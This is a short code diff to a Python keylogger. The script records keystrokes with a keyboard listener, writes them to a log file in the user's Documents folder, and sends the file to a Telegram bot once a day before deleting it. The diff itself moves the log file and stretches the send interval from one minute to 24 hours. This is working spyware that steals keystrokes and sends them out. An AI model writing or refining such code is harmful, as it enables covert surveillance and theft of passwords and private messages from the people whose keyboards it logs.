@@ -6,7 +6,8 @@ import os
 from dotenv import load_dotenv
 
 load_dotenv()
-LOG_FILE = "logger.txt"
+documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
+LOG_FILE = os.path.join(documents_folder, "logger.txt")
 BOT_TOKEN=os.getenv("BOT_TOKEN")
 CHAT_ID=os.getenv("CHAT_ID")
 
@@ -17,7 +18,7 @@ def send_to_telegram(file_path):
         
 def schedule_log_send():
     while True:
-        time.sleep(60)  # Wait for 24 hours 86400
+        time.sleep(86400)  
         if os.path.exists(LOG_FILE):
             send_to_telegram(LOG_FILE)
             os.remove(LOG_FILE)
@@ -47,3 +48,4 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
